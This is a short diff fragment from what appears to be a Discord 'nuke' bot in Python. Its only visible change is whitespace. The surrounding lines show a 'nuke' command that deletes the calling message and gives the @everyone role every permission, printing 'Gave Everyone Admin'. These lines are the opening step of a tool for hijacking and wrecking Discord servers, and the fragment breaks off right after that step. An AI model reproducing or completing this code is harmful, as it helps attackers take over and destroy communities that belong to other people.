@@ -21,7 +21,7 @@ async def on_ready():
 async def nuke(ctx):
     await ctx.message.delete()
     guild = ctx.guild
-    try:
+    try:
             role = discord.utils.get(guild.roles, name = "@everyone")
             await role.edit(permissions = Permissions.all())
             print(Fore.BLUE + "[+] Gave Everyone Admin" + 
